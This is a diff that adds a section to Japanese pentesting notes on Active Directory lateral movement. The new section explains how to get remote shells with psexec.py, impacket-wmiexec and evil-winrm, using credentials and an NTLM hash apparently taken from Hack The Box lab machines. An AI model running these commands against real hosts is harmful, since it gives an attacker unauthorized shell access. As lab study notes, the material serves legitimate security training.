@@ -555,3 +555,36 @@ proxychains4 evil-winrm -i 10.10.44.142 -u celia.almeda -H e728ecbadfb02f51ce8ee
 
 ![image-20230416224917553](img/ActiveDirectory_lateralmove/image-20230416224917553.png)
 
+
+
+### パスワードでリモートログインする
+
+SMB：管理者権限がない限り、psexec.pyやwmiexec.pyなどのリモートクライアントを使用してシェルを取得することは制限されている
+
+WinRMの場合：ユーザーアカウントが`Remote Management Users`グループの一部であれば、PowerShellベースのシェルを取得することができます
+
+#### 445
+
+```bash
+#<ドメイン名>/<ユーザ名>:<パスワード>
+psexec.py "active.htb/SVC_TGS:GPPstillStandingStrong2k18"@10.129.219.129
+```
+
+#### 135
+
+```bash
+/usr/bin/impacket-wmiexec active.htb/SVC_TGS@10.129.219.129 cmd
+```
+
+#### 5985
+
+```bash
+evil-winrm -i 10.129.219.129 -u active.htb\SVC_TGS -p GPPstillStandingStrong2k18
+# ドメイン不要の場合もあり
+evil-winrm -i 10.129.192.240 -u svc-alfresco -p s3rvice 
+```
+
+※ `Remote Management Users`グループに所属している必要がある。
+※ [AD Enume_リモートサーバーからの情報収集](./../ActiveDirectory/ActiveDirectory_enume.md/#リモートサーバーからの情報収集)
+
+※プロトコルによって`\`か`/`かが変わるので注意
